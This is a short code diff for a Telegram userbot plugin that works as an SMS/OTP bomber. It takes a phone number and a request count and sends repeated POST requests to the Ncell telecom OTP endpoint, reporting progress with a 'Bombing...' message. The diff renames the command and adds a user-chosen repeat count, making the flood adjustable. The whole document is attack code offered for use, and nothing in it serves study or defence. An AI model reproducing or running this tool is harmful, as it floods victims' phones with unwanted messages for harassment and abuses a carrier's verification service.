@@ -4,13 +4,14 @@ import asyncio
 import requests
 from userbot.utils import admin_cmd
 from time import sleep
-@borg.on(admin_cmd("bombncell (.*)"))
+@borg.on(admin_cmd("ncell (.*)"))
 async def _(event):
     num=0
-    n=100
+    n=0
     input_str = event.pattern_match.group(1)
     if input_str:
-        num = int(input_str)
+        num = int(input_str[:10])
+        n = int(input_str[11:])
     else:
         await event.edit("Enter a number!")
         return
@@ -18,6 +19,8 @@ async def _(event):
     await event.edit("`Bombing....`")
     for i in range (n):
         if i%5==0:
+            requests.post("https://prbt.ncell.axiata.com/Handlers/OTPActions.ashx?lang=ENGL",params=paramss)
+            await event.edit(f"`Bombing... {i}`")
             sleep(1)
         else:
             requests.post("https://prbt.ncell.axiata.com/Handlers/OTPActions.ashx?lang=ENGL",params=paramss)
